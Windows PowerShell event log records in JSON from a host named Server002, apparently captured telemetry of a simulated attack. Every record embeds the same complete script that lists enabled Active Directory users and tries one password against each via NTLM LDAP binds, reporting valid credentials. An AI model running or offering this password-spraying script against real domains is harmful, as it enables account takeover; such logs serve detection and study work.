{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-24 13:46:41.1183464"},"EventRecordID":"1043","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Registry, Started, \tProviderName=Registry\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=1\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=9ce05dc5-78b6-4766-81cc-f474a198a218\r\n\tHostApplication=powershell.exe &amp; {if (\"NTLM\".ToLower() -NotIn @(\"ntlm\",\"kerberos\")) {\r\n Write-Host \"Only 'NTLM' and 'Kerberos' auth methods are supported\"\r\n exit 1\r\n}\r\n\r\n$DomainUsers = Get-ADUser -LDAPFilter '(&amp;(sAMAccountType=805306368)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' -Server $env:UserDnsDomain | Select-Object -ExpandProperty SamAccountName\r\n\r\n[System.Reflection.Assembly]::LoadWithPartialName(\"System.DirectoryServices.Protocols\") | Out-Null\r\n$di = new-object System.DirectoryServices.Protocols.LdapDirectoryIdentifier(\"$env:UserDnsDomain\",389)\r\n\r\n$DomainUsers | Foreach-Object {\r\n $user = $_\r\n $password = 'P@ssw0rd!'\r\n\r\n $credz = new-object System.Net.NetworkCredential($user, $password, \"$env:UserDnsDomain\")\r\n $conn = new-object System.DirectoryServices.Protocols.LdapConnection($di, $credz, [System.DirectoryServices.Protocols.AuthType]::NTLM)\r\n try {\r\n Write-Host \" [-] Attempting ${password} on account ${user}.\"\r\n $conn.bind()\r\n # if credentials aren't correct, it will break just above and goes into catch block, so if we're here we can display success\r\n Write-Host \" [!] ${user}:${password} are valid credentials!\"\r\n } catch {\r\n Write-Host $_.Exception.Message\r\n }\r\n}\r\nWrite-Host \"End of password spraying\"}\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-24 13:46:41.1227176"},"EventRecordID":"1044","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Alias, Started, \tProviderName=Alias\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=3\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=9ce05dc5-78b6-4766-81cc-f474a198a218\r\n\tHostApplication=powershell.exe &amp; {if (\"NTLM\".ToLower() -NotIn @(\"ntlm\",\"kerberos\")) {\r\n Write-Host \"Only 'NTLM' and 'Kerberos' auth methods are supported\"\r\n exit 1\r\n}\r\n\r\n$DomainUsers = Get-ADUser -LDAPFilter '(&amp;(sAMAccountType=805306368)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' -Server $env:UserDnsDomain | Select-Object -ExpandProperty SamAccountName\r\n\r\n[System.Reflection.Assembly]::LoadWithPartialName(\"System.DirectoryServices.Protocols\") | Out-Null\r\n$di = new-object System.DirectoryServices.Protocols.LdapDirectoryIdentifier(\"$env:UserDnsDomain\",389)\r\n\r\n$DomainUsers | Foreach-Object {\r\n $user = $_\r\n $password = 'P@ssw0rd!'\r\n\r\n $credz = new-object System.Net.NetworkCredential($user, $password, \"$env:UserDnsDomain\")\r\n $conn = new-object System.DirectoryServices.Protocols.LdapConnection($di, $credz, [System.DirectoryServices.Protocols.AuthType]::NTLM)\r\n try {\r\n Write-Host \" [-] Attempting ${password} on account ${user}.\"\r\n $conn.bind()\r\n # if credentials aren't correct, it will break just above and goes into catch block, so if we're here we can display success\r\n Write-Host \" [!] ${user}:${password} are valid credentials!\"\r\n } catch {\r\n Write-Host $_.Exception.Message\r\n }\r\n}\r\nWrite-Host \"End of password spraying\"}\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-24 13:46:41.1227176"},"EventRecordID":"1045","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Environment, Started, \tProviderName=Environment\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=5\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=9ce05dc5-78b6-4766-81cc-f474a198a218\r\n\tHostApplication=powershell.exe &amp; {if (\"NTLM\".ToLower() -NotIn @(\"ntlm\",\"kerberos\")) {\r\n Write-Host \"Only 'NTLM' and 'Kerberos' auth methods are supported\"\r\n exit 1\r\n}\r\n\r\n$DomainUsers = Get-ADUser -LDAPFilter '(&amp;(sAMAccountType=805306368)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' -Server $env:UserDnsDomain | Select-Object -ExpandProperty SamAccountName\r\n\r\n[System.Reflection.Assembly]::LoadWithPartialName(\"System.DirectoryServices.Protocols\") | Out-Null\r\n$di = new-object System.DirectoryServices.Protocols.LdapDirectoryIdentifier(\"$env:UserDnsDomain\",389)\r\n\r\n$DomainUsers | Foreach-Object {\r\n $user = $_\r\n $password = 'P@ssw0rd!'\r\n\r\n $credz = new-object System.Net.NetworkCredential($user, $password, \"$env:UserDnsDomain\")\r\n $conn = new-object System.DirectoryServices.Protocols.LdapConnection($di, $credz, [System.DirectoryServices.Protocols.AuthType]::NTLM)\r\n try {\r\n Write-Host \" [-] Attempting ${password} on account ${user}.\"\r\n $conn.bind()\r\n # if credentials aren't correct, it will break just above and goes into catch block, so if we're here we can display success\r\n Write-Host \" [!] ${user}:${password} are valid credentials!\"\r\n } catch {\r\n Write-Host $_.Exception.Message\r\n }\r\n}\r\nWrite-Host \"End of password spraying\"}\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-24 13:46:41.1337331"},"EventRecordID":"1046","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"FileSystem, Started, \tProviderName=FileSystem\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=7\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=9ce05dc5-78b6-4766-81cc-f474a198a218\r\n\tHostApplication=powershell.exe &amp; {if (\"NTLM\".ToLower() -NotIn @(\"ntlm\",\"kerberos\")) {\r\n Write-Host \"Only 'NTLM' and 'Kerberos' auth methods are supported\"\r\n exit 1\r\n}\r\n\r\n$DomainUsers = Get-ADUser -LDAPFilter '(&amp;(sAMAccountType=805306368)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' -Server $env:UserDnsDomain | Select-Object -ExpandProperty SamAccountName\r\n\r\n[System.Reflection.Assembly]::LoadWithPartialName(\"System.DirectoryServices.Protocols\") | Out-Null\r\n$di = new-object System.DirectoryServices.Protocols.LdapDirectoryIdentifier(\"$env:UserDnsDomain\",389)\r\n\r\n$DomainUsers | Foreach-Object {\r\n $user = $_\r\n $password = 'P@ssw0rd!'\r\n\r\n $credz = new-object System.Net.NetworkCredential($user, $password, \"$env:UserDnsDomain\")\r\n $conn = new-object System.DirectoryServices.Protocols.LdapConnection($di, $credz, [System.DirectoryServices.Protocols.AuthType]::NTLM)\r\n try {\r\n Write-Host \" [-] Attempting ${password} on account ${user}.\"\r\n $conn.bind()\r\n # if credentials aren't correct, it will break just above and goes into catch block, so if we're here we can display success\r\n Write-Host \" [!] ${user}:${password} are valid credentials!\"\r\n } catch {\r\n Write-Host $_.Exception.Message\r\n }\r\n}\r\nWrite-Host \"End of password spraying\"}\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-24 13:46:41.1337331"},"EventRecordID":"1047","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Function, Started, \tProviderName=Function\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=9\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=9ce05dc5-78b6-4766-81cc-f474a198a218\r\n\tHostApplication=powershell.exe &amp; {if (\"NTLM\".ToLower() -NotIn @(\"ntlm\",\"kerberos\")) {\r\n Write-Host \"Only 'NTLM' and 'Kerberos' auth methods are supported\"\r\n exit 1\r\n}\r\n\r\n$DomainUsers = Get-ADUser -LDAPFilter '(&amp;(sAMAccountType=805306368)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' -Server $env:UserDnsDomain | Select-Object -ExpandProperty SamAccountName\r\n\r\n[System.Reflection.Assembly]::LoadWithPartialName(\"System.DirectoryServices.Protocols\") | Out-Null\r\n$di = new-object System.DirectoryServices.Protocols.LdapDirectoryIdentifier(\"$env:UserDnsDomain\",389)\r\n\r\n$DomainUsers | Foreach-Object {\r\n $user = $_\r\n $password = 'P@ssw0rd!'\r\n\r\n $credz = new-object System.Net.NetworkCredential($user, $password, \"$env:UserDnsDomain\")\r\n $conn = new-object System.DirectoryServices.Protocols.LdapConnection($di, $credz, [System.DirectoryServices.Protocols.AuthType]::NTLM)\r\n try {\r\n Write-Host \" [-] Attempting ${password} on account ${user}.\"\r\n $conn.bind()\r\n # if credentials aren't correct, it will break just above and goes into catch block, so if we're here we can display success\r\n Write-Host \" [!] ${user}:${password} are valid credentials!\"\r\n } catch {\r\n Write-Host $_.Exception.Message\r\n }\r\n}\r\nWrite-Host \"End of password spraying\"}\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-24 13:46:41.1337331"},"EventRecordID":"1048","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Variable, Started, \tProviderName=Variable\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=11\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=9ce05dc5-78b6-4766-81cc-f474a198a218\r\n\tHostApplication=powershell.exe &amp; {if (\"NTLM\".ToLower() -NotIn @(\"ntlm\",\"kerberos\")) {\r\n Write-Host \"Only 'NTLM' and 'Kerberos' auth methods are supported\"\r\n exit 1\r\n}\r\n\r\n$DomainUsers = Get-ADUser -LDAPFilter '(&amp;(sAMAccountType=805306368)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' -Server $env:UserDnsDomain | Select-Object -ExpandProperty SamAccountName\r\n\r\n[System.Reflection.Assembly]::LoadWithPartialName(\"System.DirectoryServices.Protocols\") | Out-Null\r\n$di = new-object System.DirectoryServices.Protocols.LdapDirectoryIdentifier(\"$env:UserDnsDomain\",389)\r\n\r\n$DomainUsers | Foreach-Object {\r\n $user = $_\r\n $password = 'P@ssw0rd!'\r\n\r\n $credz = new-object System.Net.NetworkCredential($user, $password, \"$env:UserDnsDomain\")\r\n $conn = new-object System.DirectoryServices.Protocols.LdapConnection($di, $credz, [System.DirectoryServices.Protocols.AuthType]::NTLM)\r\n try {\r\n Write-Host \" [-] Attempting ${password} on account ${user}.\"\r\n $conn.bind()\r\n # if credentials aren't correct, it will break just above and goes into catch block, so if we're here we can display success\r\n Write-Host \" [!] ${user}:${password} are valid credentials!\"\r\n } catch {\r\n Write-Host $_.Exception.Message\r\n }\r\n}\r\nWrite-Host \"End of password spraying\"}\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"400"},"Version":"0","Level":"4","Task":"4","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-24 13:46:41.2637788"},"EventRecordID":"1049","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Available, None, \tNewEngineState=Available\r\n\tPreviousEngineState=None\r\n\r\n\tSequenceNumber=13\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=9ce05dc5-78b6-4766-81cc-f474a198a218\r\n\tHostApplication=powershell.exe &amp; {if (\"NTLM\".ToLower() -NotIn @(\"ntlm\",\"kerberos\")) {\r\n Write-Host \"Only 'NTLM' and 'Kerberos' auth methods are supported\"\r\n exit 1\r\n}\r\n\r\n$DomainUsers = Get-ADUser -LDAPFilter '(&amp;(sAMAccountType=805306368)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' -Server $env:UserDnsDomain | Select-Object -ExpandProperty SamAccountName\r\n\r\n[System.Reflection.Assembly]::LoadWithPartialName(\"System.DirectoryServices.Protocols\") | Out-Null\r\n$di = new-object System.DirectoryServices.Protocols.LdapDirectoryIdentifier(\"$env:UserDnsDomain\",389)\r\n\r\n$DomainUsers | Foreach-Object {\r\n $user = $_\r\n $password = 'P@ssw0rd!'\r\n\r\n $credz = new-object System.Net.NetworkCredential($user, $password, \"$env:UserDnsDomain\")\r\n $conn = new-object System.DirectoryServices.Protocols.LdapConnection($di, $credz, [System.DirectoryServices.Protocols.AuthType]::NTLM)\r\n try {\r\n Write-Host \" [-] Attempting ${password} on account ${user}.\"\r\n $conn.bind()\r\n # if credentials aren't correct, it will break just above and goes into catch block, so if we're here we can display success\r\n Write-Host \" [!] ${user}:${password} are valid credentials!\"\r\n } catch {\r\n Write-Host $_.Exception.Message\r\n }\r\n}\r\nWrite-Host \"End of password spraying\"}\r\n\tEngineVersion=5.1.19041.5007\r\n\tRunspaceId=369c8edf-e287-4ae8-bfb1-2c70029dc151\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"403"},"Version":"0","Level":"4","Task":"4","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-24 13:46:42.0715811"},"EventRecordID":"1050","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Stopped, Available, \tNewEngineState=Stopped\r\n\tPreviousEngineState=Available\r\n\r\n\tSequenceNumber=15\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=9ce05dc5-78b6-4766-81cc-f474a198a218\r\n\tHostApplication=powershell.exe &amp; {if (\"NTLM\".ToLower() -NotIn @(\"ntlm\",\"kerberos\")) {\r\n Write-Host \"Only 'NTLM' and 'Kerberos' auth methods are supported\"\r\n exit 1\r\n}\r\n\r\n$DomainUsers = Get-ADUser -LDAPFilter '(&amp;(sAMAccountType=805306368)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' -Server $env:UserDnsDomain | Select-Object -ExpandProperty SamAccountName\r\n\r\n[System.Reflection.Assembly]::LoadWithPartialName(\"System.DirectoryServices.Protocols\") | Out-Null\r\n$di = new-object System.DirectoryServices.Protocols.LdapDirectoryIdentifier(\"$env:UserDnsDomain\",389)\r\n\r\n$DomainUsers | Foreach-Object {\r\n $user = $_\r\n $password = 'P@ssw0rd!'\r\n\r\n $credz = new-object System.Net.NetworkCredential($user, $password, \"$env:UserDnsDomain\")\r\n $conn = new-object System.DirectoryServices.Protocols.LdapConnection($di, $credz, [System.DirectoryServices.Protocols.AuthType]::NTLM)\r\n try {\r\n Write-Host \" [-] Attempting ${password} on account ${user}.\"\r\n $conn.bind()\r\n # if credentials aren't correct, it will break just above and goes into catch block, so if we're here we can display success\r\n Write-Host \" [!] ${user}:${password} are valid credentials!\"\r\n } catch {\r\n Write-Host $_.Exception.Message\r\n }\r\n}\r\nWrite-Host \"End of password spraying\"}\r\n\tEngineVersion=5.1.19041.5007\r\n\tRunspaceId=369c8edf-e287-4ae8-bfb1-2c70029dc151\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
